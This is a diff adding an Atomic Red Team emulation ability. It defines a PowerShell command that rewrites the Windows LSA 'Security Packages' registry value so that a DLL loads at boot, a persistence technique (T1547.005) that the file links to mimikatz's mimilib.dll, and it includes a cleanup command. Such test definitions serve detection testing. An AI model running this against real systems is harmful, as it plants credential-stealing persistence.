@@ -1,0 +1,40 @@
+- id: afdfd7e3-8a0b-409f-85f7-886fdf249c9e
+  name: Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider
+    configuration in registry
+  description: 'Add a value to a Windows registry Security Support Provider pointing
+    to a payload .dll which will normally need to be copied in the system32 folder.
+
+    A common DLL used with this techquite is the minilib.dll from mimikatz, see https://pentestlab.blog/2019/10/21/persistence-security-support-provider/'
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1547.005
+    name: 'Boot or Logon Autostart Execution: Security Support Provider'
+  platforms:
+    windows:
+      psh:
+        command: $oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa
+          -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');;
+          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name
+          'Security Packages old' -Value "$oldvalue";; $newvalue = "AtomicTest.dll";;
+          Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security
+          Packages' -Value $newvalue
+        cleanup: $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\System\CurrentControlSet\Control\Lsa"
+          -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security
+          Packages old');; Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa
+          -Name 'Security Packages' -Value "$oldvalue";; Remove-ItemProperty -Path  "HKLM:\System\CurrentControlSet\Control\Lsa"
+          -Name 'Security Packages old';
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - privilege-escalation
+  - t1547.005
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2020-01-24T17:16:11.806Z'
+    atomic_guid: afdfd7e3-8a0b-409f-85f7-886fdf249c9e
+    import_timestamp: '2025-06-24T11:15:02.001832Z'
